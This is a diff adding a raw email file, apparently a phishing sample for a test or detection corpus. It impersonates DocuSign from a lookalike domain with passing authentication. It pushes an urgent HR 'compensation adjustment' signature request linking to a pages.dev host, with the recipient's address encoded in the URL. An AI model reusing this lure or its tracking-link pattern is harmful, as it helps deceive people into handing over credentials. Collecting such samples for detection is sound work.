@@ -1,0 +1,18 @@
+Delivered-To: alex.morgan@example.org
+Received: by 2002:a05:7300:1234 with SMTP id q1csp1; Mon, 19 Oct 2026 16:00:06 -0700 (PDT)
+Received: from mail.docusign-secure-review.net (mail.docusign-secure-review.net [198.51.100.23])
+        by mx.google.com with ESMTPS id x1si2
+        for <alex.morgan@example.org>; Mon, 19 Oct 2026 16:00:05 +0000
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@docusign-secure-review.net;
+       spf=pass smtp.mailfrom=docusign-secure-review.net;
+       dmarc=pass (p=NONE) header.from=docusign-secure-review.net
+From: "DocuSign" <dse@docusign-secure-review.net>
+To: alex.morgan@example.org
+Subject: Please review and sign: Q4 Compensation Adjustment.pdf
+Date: Mon, 19 Oct 2026 16:00:00 +0000
+Message-ID: <a81@docusign-secure-review.net>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<p>Your HR department sent you a document to review and sign.</p><p><a href="https://review-docs-7731.pages.dev/sign#YWxleC5tb3JnYW5AZXhhbXBsZS5vcmc=">REVIEW DOCUMENT</a></p><p>Please complete within 24 hours or the request will expire.</p>
